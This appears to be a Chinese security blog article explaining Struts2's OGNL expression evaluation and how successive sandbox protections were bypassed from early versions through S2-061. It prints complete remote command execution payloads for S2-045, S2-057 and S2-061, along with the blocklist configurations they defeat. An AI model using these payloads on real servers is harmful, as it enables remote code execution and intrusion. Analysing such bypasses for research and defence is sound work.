> 原文链接: https://www.anquanke.com//post/id/239783 


# 从零带你看struts2中ognl命令执行漏洞


                                阅读量   
                                **117213**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t0180fa07e8205fe0e3.png)](https://p4.ssl.qhimg.com/t0180fa07e8205fe0e3.png)



hi!! 新面孔打个招呼~最近花了蛮长时间看 Struts2 的漏洞，可能某些安全研究人员（像我）会选择 Struts2 作为入手 java 研究的第一个框架，毕竟最早实现 MVC（Model+View+Controller） 模式的 java web 框架就是 struts 了。所以输出这篇文章记录下我的总结以及理解，如果能对你有所帮助就更好了 ~！

本文不会对 struts2 漏洞的调用链跟进进行阐述，仅是从 struts2 框架中通过 ognl 产生命令执行漏洞的位置以及 struts2 版本更新安全防护升级相应命令执行 PoC 的更新两个角度进行切入。另如有错误烦请指正，谢谢！

文章导航

文章分为四个部分来阐述：
- 对 struts2 框架进行介绍；
- 对 struts2 框架 OGNL 语法进行介绍；
<li>
struts2 命令执行系列漏洞产生的位置；</li>
<li>
struts2 版本变化对应 PoC 的变化</li>
## 一、 struts2 框架介绍

struts2 由 struts1 升级得名，而其中却是采用 Webwork2 作为其代码基础，完全摒弃 struts1 的设计思想及代码，并以 xwork 作为底层实现的核心，以 ognl 作为浏览器与 java 对象数据流转沟通的语言，实现不同形式数据之间的转换与通信。

可以一起看一下 struts2 中一个请求从进入到返回响应会经历哪些过程以及 xwork 核心中各个元素如何配合让程序运转。

下图为请求从输入到输出的过程：

[![](https://p0.ssl.qhimg.com/t01b259f396ed41e63b.png)](https://p0.ssl.qhimg.com/t01b259f396ed41e63b.png)

（图出自 [https://blog.csdn.net/qq_32166627/article/details/70050012](https://blog.csdn.net/qq_32166627/article/details/70050012)）

首先当 struts2 项目启动时，会先加载 web.xml ，由其中定义的入口程序 StrutsPrepareAndExecuteFilter 进行容器的初始化以及转发我们的请求。由其中的 init 函数进行初始化，加载配置文件信息，对内置对象进行创建及缓存，创建接下来 struts2 操作的运行环境。

由 doFilter 函数中对封装成 HttpServletRequest 的 http 请求进行预处理以及转发执行。

在这期间 struts2 需要知道这个请求具体由哪个 action 的哪个方法处理，那么在 doFilter 中，在这里会进行请求和 action 之间的映射，具体为根据输入的 url 截取相关信息存入 org.apache.struts2.dispatcher.mapper.ActionMapping 对象属性中，属性包括了请求的 action 、method 、param 、namespace 等（也就是图中的第 3 步）。当然不一定请求的 action ，比如请求 jsp 文件等，那么 ActionMapping 映射为空，则不由 struts2 转发处理。不为空则由 ActionProxy 根据 ActionMapping 映射信息以及 ConfigurationManager 配置信息，找到我们具体要访问的 Action 类（也是图中的 6、7 步）。接着通过 ActionProxy 创建 ActionInvocation 实例，由 ActionInvocation 实例调度访问 Action 。

在访问 Action 之前，会先执行一个拦截器栈，在拦截器栈中会对请求进行一些处理，比如在 ParametersInterceptor 中将参数通过 setter 、getter 方法对 Action 的属性赋值，在 ConversionErrorInterceptor 中对参数类型转换出错时进行拦截处理等。

接下来才会去访问 Action 类。执行完成返回一个结果，结果可能是视图文件，也有可能是去访问另一个 action ，那么如果是访问另一个 action 就重新进行映射，由 ActionProxy 创建 ActionInvocation 进行调度等，如果是返回一个视图文件，那么逆序拦截器栈执行完，最终通过 HTTPServletResponse 返回响应。

前面洋洋洒洒一大堆，其中有一些比如 ActionProxy 、ActionInvocation 等类可能是陌生的，所以我们可以看一下各个元素。其实上面流程中由 ActionProxy 接管请求信息起，就是 xwork 框架的入口了。下图为 xwork 的宏观示意图。

[![](https://p2.ssl.qhimg.com/t018df9f6db8d23e646.png)](https://p2.ssl.qhimg.com/t018df9f6db8d23e646.png)

这些节点元素里面可以分为负责请求响应的执行元素（控制流元素）以及进行请求响应所依赖的数据元素（数据流元素）。而执行元素中负责定义事件处理的基本流程的：Interceptor（拦截器，对 Action 的逻辑扩展）、 Action（核心处理类）、 Result（执行结果，负责对 Action 的响应进行逻辑跳转），以及负责调度执行的： ActionProxy （提供一个无干扰的执行环境）、ActionInvocation（组织调度 Action 、Interceptor 、Result 节点执行顺序的核心调度器）。而数据流元素则包括了 ActionContext 以及 ValueStack 。其中 ActionContext 中提供了 xwork 进行事件处理过程中需要用到的框架对象（比如：container、ValueStack、actionInvocation 等）以及数据对象（比如：session、application、parameters 等）。而 ValueStack 则主要对 ognl 计算进行扩展，是进行数据访问、 ognl 计算的场所，在 xwork 中实现了 ValueStack 的类就是 OgnlValueStack 。

以上这些概念可能对理解 struts2 框架有所帮助。那么回到主题 struts2 中 ognl 所产生的命令执行的漏洞，就不得不提一些必要的概念。

## 二、 struts2 框架 OGNL 语法

struts2 中使用 Ognl 作为数据流转的“催化剂”。要知道在视图展现中，我们看到的都是字符串，而我们进行逻辑处理时的数据是丰富的，可能是某个类对象，那么如果我们想在页面中展示对象数据就需要一个转换器，这个转换器就是常说的表达式引擎，他负责将对象翻译成字符串，当然这个关系不是单向的，他也可以通过规则化的字符串翻译为对对象的操作。struts2 使用了 ognl 作为他的翻译官，ognl 不仅仅应用于页面字符串与对象数据转换，在 struts2 中各个模块进行数据处理时也会用到。

进行 ognl 表达式计算最主要的元素包括：表达式、 root 对象、上下文环境（ context ）。其中表达式表达了这次 ognl 解析要干什么， root 对象表示通常 ognl 操作的对象，而上下文环境表示通常 ognl 运行的环境。而 root 对象和 context 上下文环境都是 OgnlValueStack 的属性值。如下图所示：

[![](https://p5.ssl.qhimg.com/t0144fc22aacee538e5.png)](https://p5.ssl.qhimg.com/t0144fc22aacee538e5.png)

而其中 root 对象是一个栈结构，每一次请求都会将请求的 action 压入 root 栈顶，所以我们在 url 中可以输入 action 中的属性进行赋值，在参数拦截器中会从 root 栈中从栈顶到栈底依次找同名的属性名进行赋值。

[![](https://p5.ssl.qhimg.com/t01c3144f56abcefa01.png)](https://p5.ssl.qhimg.com/t01c3144f56abcefa01.png)

context 对象是一个 map 结构，其中 key 为对象的引用，value 为对象具体的存储信息。（这其中还存储了 OgnlValueStack 的引用）

[![](https://p1.ssl.qhimg.com/t016fc1dbac6ee88a45.png)](https://p1.ssl.qhimg.com/t016fc1dbac6ee88a45.png)

可以来看看 ognl 怎么对 OgnlValueStack 中的对象进行操作。

对 root 对象的访问：
<li>
name// 获取 root 对象中 name 属性的值</li>
<li>
department.name// 获取 root 对象中 department 属性的 name 属性的值</li>
<li>
department[‘name’] 、 department[“name”]
</li>
对 context 上下文环境的访问：
<li>
#introduction// 获取上下文环境中名为 introduction 对象的值</li>
<li>
#parameters.user// 获取上下文环境中 parameters 对象中的 user 属性的值</li>
<li>
#parameters[‘user’] 、 #parameters[“user”]
</li>
对静态变量 / 方法的访问：@[class]@[field/method]
<li>
@com.example.core.Resource@ENABLE// 访问 com.example.core.Resource 类中 ENABLE 属性</li>
<li>
@com.example.core.Resource@get()// 调用 com.example.core.Resource 类中 get 方法</li>
方法调用：类似 java 方法调用
<li>
group.containsUser(#requestUser)// 调用 root 对象中 group 中的 containsUser 方法，并传入 context 中名为 requestUser的对象作为参数</li>
## 三、struts2 中 ognl 命令执行漏洞产生的位置

有了前面的基础知识，可以逐渐步入正题。简要总结了 struts2 中 ognl 命令执行漏洞在框架中产生的位置及其原因。

[![](https://p1.ssl.qhimg.com/t01e82235d8bea16649.png)](https://p1.ssl.qhimg.com/t01e82235d8bea16649.png)

图中的赋值内容就是我们之后的 PoC 内容，进而解析执行触发。

## 四、struts2 版本变化对应 PoC 的变化

“修补”旅途的开始， struts2 中对 ognl 表达式执行也进行了一定的防护。具体体现在 MemberAccess 接口中规定了 ognl 的对象方法 / 属性访问策略。实现 MemberAccess 接口的有两类：一个是在 ognl 中实现的 DefaultMemberAccess ，默认禁止访问 private 、protected 、package protected 修饰的属性方法。一个是 xwork 中对对象方法访问策略进行了扩展的 SecurityMemberAccess ，指定是否支持访问静态方法，默认设置为 false 。

```
public class SecurityMemberAccess extends DefaultMemberAccess `{`
private boolean allowStaticMethodAccess;
Set&lt;Pattern&gt; excludeProperties = Collections.emptySet();
Set&lt;Pattern&gt; acceptProperties = Collections.emptySet();

public SecurityMemberAccess(boolean method) `{`
super(false);
this.allowStaticMethodAccess = method;
`}`

…
```

而在 SecurityMemberAccess中同时也提供了 setAllowStaticMethodAccess 、getAllowStaticMethodAccess 方法，且修饰符为 public 。所以绕过这一版本的防护的 PoC ：

```
(#_memberAccess['allowStaticMethodAccess']=true).(@java.lang.Runtime@getRuntime().exec('calc'))
```

首先通过 #_memberAccess 获取 SecurityMemberAccess 实例，通过 setAllowStaticMethodAccess 方法设置其值为 true ，允许执行静态方法。

接着在 Struts2.3.14.2+ 中，SecurityMemberAccess 对 allowStaticMethodAccess 加了 final 修饰并将 setAllowStaticMethodAccess 方法去除了。

这里绕过就有两种方法：【 PoC 参考：S2-012、S2-015、S2-016（影响的版本：Struts 2.0.0 – Struts 2.3.15）】

通过反射将 allowStaticMethodAccess 的值改变

```
#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess")

#f.setAccessible(true)

#f.set(#_memberAccess,true)
```

新建一个 ProcessBuilder 实例，调用 start 方法来执行命令

```
(#p=new java.lang.ProcessBuilder('calc')).(#p.start())
```

接着在 Struts2.3.20+ 中，SecurityMemberAccess 中增加了 excludedClasses ， excludedPackageNames 以及 excludedPackageNamePatterns 三个黑名单属性。这三个属性在 SecurityMemberAccess#isAccessible 方法中遍历判断了当前操作类是否在黑名单类中，而在 ognl 表达式执行时 OgnlRuntime 类中 callConstructor、getMethodValue、setMethodValue、getFieldValue、isFieldAccessible、isMethodAccessible、invokeMethod 调用了此方法。也即是在 ognl 表达式在执行以上操作时判断了当前操作类是否在黑名单中。

黑名单属性在 struts-default.xml 中定义：

Struts2.3.28 struts-default.xml ：

```
&lt;constant name="struts.excludedClasses"
value="
java.lang.Object,
java.lang.Runtime,
java.lang.System,
java.lang.Class,
java.lang.ClassLoader,
java.lang.Shutdown,
java.lang.ProcessBuilder,
ognl.OgnlContext,
ognl.ClassResolver,
ognl.TypeConverter,
com.opensymphony.xwork2.ognl.SecurityMemberAccess,
com.opensymphony.xwork2.ActionContext" /&gt;

&lt;constant name="struts.excludedPackageNames" value="java.lang.,ognl,javax" /&gt;
```

绕过：【 PoC 参考：S2-032（影响版本：struts2.3.20 – struts2.3.28 (除去 2.3.20.3 及 2.3.24.3)）】

通过 DefaultMemberAccess 替换 SecurityMemberAccess 来完成：

```
#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS
```

这样 ognl 计算时的规则就替换成了 DefaultMemberAccess 中的规则，也就没有了黑名单的限制以及静态方法的限制。这里获取类的静态属性通过 ognl.OgnlRuntime#getStaticField 获得，而该方法中没有调用 isAccessible 方法，故通过 @ognl.OgnlContext@DEFAULT_MEMBER_ACCESS 可以获取到 DefaultMemberAccess 对象，赋值给上下文环境中的 _memberAccess ，绕过黑名单限制。

接着在 Struts2.3.30+ 及 struts2.5.2+ 中，增加了 SecurityMemberAccess 中的黑名单，将 ognl.DefaultMemberAccess 以及 ognl.MemberAccess 加入了黑名单；同时在 Struts2.3.30 使用 ognl-3.0.19.jar 包 、struts2.5.2 使用 ognl-3.1.10.jar 包中的 OgnlContext 不再支持使用 #_memberAccess 获得 MemberAccess 实例。

struts2.5.10 ：

```
&lt;constant name="struts.excludedClasses"

value="

java.lang.Object,

java.lang.Runtime,

java.lang.System,

java.lang.Class,

java.lang.ClassLoader,

java.lang.Shutdown,

java.lang.ProcessBuilder,

ognl.OgnlContext,

ognl.ClassResolver,

ognl.TypeConverter,

ognl.MemberAccess,

ognl.DefaultMemberAccess,

com.opensymphony.xwork2.ognl.SecurityMemberAccess,

com.opensymphony.xwork2.ActionContext" /&gt;

&lt;constant name="struts.excludedPackageNames" value="java.lang.,ognl,javax,freemarker.core,freemarker.template" /&gt;
```

绕过：【 PoC 参考 S2-045 ，影响版本 Struts 2.3.5 – Struts 2.3.31, Struts 2.5 – Struts 2.5.10 】

通过 ognl.OgnlContext#setMemberAccess 方法将 DefaultMemberAccess 设为 ognl 表达式计算的规则。

```
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#context.setMemberAccess(#dm))
```

[![](https://p1.ssl.qhimg.com/t013e9f11583ad6fd97.png)](https://p1.ssl.qhimg.com/t013e9f11583ad6fd97.png)

这样无需通过 #_memberAccess 的形式获取实例，而是直接改变 OgnlContext 中的 _memberAccess 属性。但是调用 setMemberAccess 方法会触发检查黑名单，ognl.OgnlContext 俨然在黑名单中，那怎么绕过黑名单呢？

通过 OgnlUtil 改变 SecurityMemberAccess 黑名单属性值：

```
(#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).

(#ognlUtil= #container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).

(#ognlUtil.getExcludedPackageNames().clear()).

(#ognlUtil.getExcludedClasses().clear())
```

[![](https://p1.ssl.qhimg.com/t014132c9e262bd4fc6.jpg)](https://p1.ssl.qhimg.com/t014132c9e262bd4fc6.jpg)

从上图中可以看出在 StrutsPrepareAndExecuteFilter#doFilter 初始化 OgnlValueStack 中 SecurityMemberAccess 的黑名单集合时是通过 ognlUtil 中的黑名单集合进行赋值的，他们共享同一个黑名单地址，那么是不是将 OgnlUtil 中的黑名单清空 SecurityMemberAccess 中的黑名单也清空了。

故在 PoC 中首先通过容器获取 OgnlUtil 实例， OgnlUtil 是单例模式实现的对象，所以获取到的实例是唯一的，接着调用 get 方法获取黑名单集合，clear 方法清空。

我们可以一起看一下 S2-045 完整的 PoC ：

```
%`{`

(#_='multipart/form-data').

(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).

(#_memberAccess?(#_memberAccess=#dm):(

(#container=#context['com.opensymphony.xwork2.ActionContext.container']).

(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).

(#ognlUtil.getExcludedPackageNames().clear()).

(#ognlUtil.getExcludedClasses().clear()).

(#context.setMemberAccess(#dm))

)).

(#cmd='whoami').

(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).

(#cmds=(#iswin?`{`'cmd.exe','/c',#cmd`}`:`{`'/bin/bash','-c',#cmd`}`)).

(#p=new java.lang.ProcessBuilder(#cmds)).

(#p.redirectErrorStream(true)).

(#process=#p.start()).

(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).

(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).

(#ros.flush())

`}`
```

最开始的 #_=’multipart/form-data’ 是为了满足触发漏洞的要求，接下来就是将 DefaultMemberAccess 存入 OgnlContext 上下文环境中，接着一个三目运算符主要为了适配低版本中可以直接取到 _memberAccess 对象，取不到就按前面绕过的形式将黑名单清空并将 DefaultMemberAccess 设为默认安全策略。接下来就是执行命令并输出了。

接着在 Struts2.5.13+ 中，excludedClasses 等黑名单集合设为不可变集合（从 struts 2.5.12 开始就不再可变）通过前面 PoC 中的 clear 函数来清除数据会抛出异常：java.lang.UnsupportedOperationException at java.util.Collections$UnmodifiableCollection.clear 。同时 struts 2.5.13 使用的 ognl-3.1.15.jar 包中 OgnlContext 不再支持使用 #context 获取上下文环境。

com.opensymphony.xwork2.ognl.OgnlUtil#setExcludedClasses : 

```
public void setExcludedClasses(String commaDelimitedClasses) `{`

Set&lt;String&gt; classNames = TextParseUtil.commaDelimitedStringToSet(commaDelimitedClasses);

Set&lt;Class&lt;?&gt;&gt; classes = new HashSet();

Iterator i$ = classNames.iterator();

while(i$.hasNext()) `{`

String className = (String)i$.next();

try `{`

classes.add(Class.forName(className));

`}` catch (ClassNotFoundException var7) `{`

throw new ConfigurationException("Cannot load excluded class: " + className, var7);

`}`

`}`

this.excludedClasses = Collections.unmodifiableSet(classes);

`}`
```

绕过：【 PoC 参考 S2-057 ，影响版本 Struts 2.0.4 – Struts 2.3.34, Struts 2.5.0 – Struts 2.5.16 】

通过 setExcludedXXX(”) 方法实现：

```
(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))
```

但是，实操发现这样发送请求后面的命令还是不能执行，跟进 setExcludedXXX(”) 中的 Collections.unmodifiableSet(classes) 会发现其实是返回了一个新的空集合，并不是之前那个 _memberAccess 和 ognlUtil 共同引用的那个黑名单地址的集合，怎么办呐，很简单再发一次请求就可以了。为什么呢？因为提到过 OgnlUtil 是单例模式实现的，应用从始至终都用的同一个 OgnlUtil ，而 _memberAccess 的作用域是在一次请求范围内的，与此同时 OgnlUtil 中的黑名单集合已经置为空了，那么重新发一次请求，_memberAccess 重新初始化，通过 OgnlUtil 中为空的黑名单进行赋值。

还有一个需要绕过的地方：通过上下文环境中其他属性（比如这里的 attr ）来获得 context 。

```
#attr['struts.valueStack'].context
```

完整看一下 S2-057 的 PoC ：

两个数据包：

1、

```
/$`{`(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))`}`/login.action
```

2、

```
/$`{`(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('calc'))`}`/login
```

接着在 Struts2.5.20 中，使用的 ognl-3.1.21.jar 包 ognl.OgnlRuntime#getStaticField 中调用了 isAccessible 方法，同时 OgnlUtil 中 set 黑名单集合等修饰符由 public 变成了 protected 。在 Struts2.5.22+ 中，ognl.OgnlRuntime#invokeMethod 方法调用时屏蔽了常用的类，也即是就算将黑名单绕过去了方法调用时仍会判断是否是这些常用的类。同时 struts-default.xml 中定义的黑名单再次增加。

Struts2.5.25 struts-default.xml ：

```
&lt;constant name="struts.excludedClasses"

value="

java.lang.Object,

java.lang.Runtime,

java.lang.System,

java.lang.Class,

java.lang.ClassLoader,

java.lang.Shutdown,

java.lang.ProcessBuilder,

sun.misc.Unsafe,

com.opensymphony.xwork2.ActionContext" /&gt;

&lt;constant name="struts.excludedPackageNames"

value="

ognl.,

java.io.,

java.net.,

java.nio.,

javax.,

freemarker.core.,

freemarker.template.,

freemarker.ext.jsp.,

freemarker.ext.rhino.,

sun.misc.,

sun.reflect.,

javassist.,

org.apache.velocity.,

org.objectweb.asm.,

org.springframework.context.,

com.opensymphony.xwork2.inject.,

com.opensymphony.xwork2.ognl.,

com.opensymphony.xwork2.security.,

com.opensymphony.xwork2.util." /&gt;
```

相当于前面绕过方式都不能用了，比如使用 @ognl.OgnlContext@DEFAULT_MEMBER_ACCESS 获得 DefaultMemberAccess 实例；使用 #attr[‘struts.valueStack’].context 获得上下文环境；通过容器创建实例等。

绕过：

【 PoC 参考 S2-061 ，影响版本 Struts 2.0.0 – Struts 2.5.25 】

引用新的类来实现：

org.apache.tomcat.InstanceManager ：
- 使用其默认实现类 DefaultInstanceManager 的 newInstance 方法来创建实例
org.apache.commons.collections.BeanMap ：
- 通过 BeanMap#setBean 方法可以将类实例存入 BeanMap 中，存入同时进行初始化将其 set、get 方法存入当前的 writeMethod 、 readMethod 集合中；
- 通过 BeanMap#get 方法可以在当前 bean 的 readMethod 集合中找到对应 get 方法，再反射调用该方法返回一个对象；
- 通过 BeanMap#put 方法可以在当前 bean 的 writeMethod 集合中找到对应 set 方法，再反射调用该方法。
完整看一下 S2-061 的 PoC ：

```
%25`{`(#im=#application['org.apache.tomcat.InstanceManager']).

(#bm=#im.newInstance('org.apache.commons.collections.BeanMap')).

(#vs=#request['struts.valueStack']).

(#bm.setBean(#vs)).(#context=#bm.get('context')).

(#bm.setBean(#context)).(#access=#bm.get('memberAccess')).

(#bm.setBean(#access)).

(#empty=#im.newInstance('java.util.HashSet')).

(#bm.put('excludedClasses',#empty)).(#bm.put('excludedPackageNames',#empty)).

(#cmdout=#im.newInstance('freemarker.template.utility.Execute').exec(`{`'whoami'`}`))`}`
```

首先从 application 中获得 DefaultInstanceManager 实例，调用 newInstance 方法获得 BeanMap 实例。接着先将 OgnlValueStack 存入 BeanMap 中，通过 get 方法可以获得 OgnlContext 实例，获得 OgnlContext 实例就可以通过其获得 MemberAccess 实例，接着可以通过 put 方法调用 set 方法，将其黑名单置空，黑名单置空后就可以创建一个黑名单中的类实例来执行命令了。

[![](https://p0.ssl.qhimg.com/t017e7920894aac835e.png)](https://p0.ssl.qhimg.com/t017e7920894aac835e.png)

最新版本：Struts2.5.26 中再一次增加了黑名单：

```
&lt;constant name="struts.excludedClasses"

value="

java.lang.Object,

java.lang.Runtime,

java.lang.System,

java.lang.Class,

java.lang.ClassLoader,

java.lang.Shutdown,

java.lang.ProcessBuilder,

sun.misc.Unsafe,

com.opensymphony.xwork2.ActionContext" /&gt;

&lt;constant name="struts.excludedPackageNames"

value="

ognl., java.io., java.net., java.nio., javax.,

freemarker.core., freemarker.template., freemarker.ext.jsp.,

freemarker.ext.rhino.,

sun.misc., sun.reflect., javassist.,

org.apache.velocity., org.objectweb.asm.,

org.springframework.context.,

com.opensymphony.xwork2.inject.,

com.opensymphony.xwork2.ognl.,

com.opensymphony.xwork2.security.,

com.opensymphony.xwork2.util.,

org.apache.tomcat., org.apache.catalina.core.,

com.ibm.websphere., org.apache.geronimo.,

org.apache.openejb., org.apache.tomee.,

org.eclipse.jetty., org.mortbay.jetty.,

org.glassfish., org.jboss.as., org.wildfly., weblogic.," /&gt;
```

把中间件的包都给屏蔽了 orz …

## 五、结语

这篇文章主要根据 struts2 版本更新将其命令执行系列漏洞顺了一遍。struts2 框架在执行命令时主要防护机制是 SecurityMemberAccess 中的策略，以及对应使用的 ognl jar 包中的一些变化，分析时可以重点关注这两地方。另外到了 struts2.5.26 版本感觉官方将该补的都补了，但还是期待新 PoC 的出现。

## 六、参考链接

[1] 《Struts2 技术内幕——深入解析Struts2架构设计与》

[2] [https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776/](https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776/)

[3] [https://cwiki.apache.org/confluence/display/WW/Security+Bulletins](https://cwiki.apache.org/confluence/display/WW/Security+Bulletins)

[4] [https://github.com/vulhub/vulhub/tree/master/struts2](https://github.com/vulhub/vulhub/tree/master/struts2)

[5] [https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g](https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g)
